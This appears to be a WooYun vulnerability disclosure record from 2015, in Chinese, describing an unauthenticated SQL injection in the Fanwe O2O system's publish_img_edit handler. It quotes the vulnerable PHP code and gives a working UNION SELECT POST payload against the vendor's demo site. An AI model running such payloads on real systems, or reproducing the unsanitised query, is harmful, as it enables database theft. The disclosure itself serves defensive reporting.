{"id": 70936, "wybug_id": "wooyun-2015-0122566", "wybug_title": "方维O2O商业系统SQL注入4（直接出数据、demo验证）", "wybug_corp": "fanwe.com", "wybug_author": "story", "wybug_date": "2015-06-25 12:48", "wybug_open_date": "2015-09-28 12:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向公众公开  简要描述： UNION SELECT注入，直接出数据，demo验证，无需登录，只要一个POST数据库，可批量。 详细说明：  /app/Lib/main/ajaxModule.class.php\npublic function publish_img_edit(){\t\t$data = array();\t\t$data['status'] = 1;\t\t$data['html'] = '';\t\t\t\t$img_ids = $_POST['img_ids'];\t\t$img_list = $GLOBALS['db']->getAll(\"SELECT * FROM \".DB_PREFIX.\"topic_image WHERE id in(\".implode(\",\", $img_ids).\")\");\t\t//输出表情数据html 和标签数据\t\t$result = $GLOBALS['db']->getAll(\"select `type`,`title`,`emotion`,`filename` from \".DB_PREFIX.\"expression order by type\");\t\t$expression = array();\t\tforeach($result as $k=>$v)\t\t{\t\t\t$v['filename'] = \"./public/expression/\".$v['type'].\"/\".$v['filename'];\t\t\t$v['emotion'] = str_replace(array('[',']'),array('',''),$v['emotion']);\t\t\t$expression[$v['type']][] = $v;\t\t}\t\t$tag_list =$GLOBALS['db']->getAll(\"select name from \".DB_PREFIX.\"topic_tag where is_preset = 1 order by count desc\");\t\t\t\t$GLOBALS['tmpl']->assign(\"img_list\",$img_list);\t\t$GLOBALS['tmpl']->assign(\"tag_list\",$tag_list);\t\t$GLOBALS['tmpl']->assign(\"expression\",$expression);\t\t$data['html'] = $GLOBALS['tmpl']->fetch(\"inc/publish_img_edit.html\");\t\tajax_return($data);\t}\n直接拿出POST['img_ids']，插入SQL语句。$img_ids = $_POST['img_ids'];$img_list = $GLOBALS['db']->getAll(\"SELECT * FROM \".DB_PREFIX.\"topic_image WHERE id in(\".implode(\",\", $img_ids).\")\");该模块无需登录，并且有回显，可以直接union select：\n\nhttp://o2odemo.fanwe.net/index.php?ctl=ajax&act=publish_img_editPOST数据：img_ids[1]=-1) UNION SELECT%0b1,2,3,4,5,6,7,concat(0x212121,(user()),0x212121),9,10,11,12%23测试代码里附上验证脚本，demo测试截图：\n\n   漏洞证明：  \n\n   修复方案：  过滤。   版权声明：转载请注明来源 story@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-06-30 12:34 厂商回复： 正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}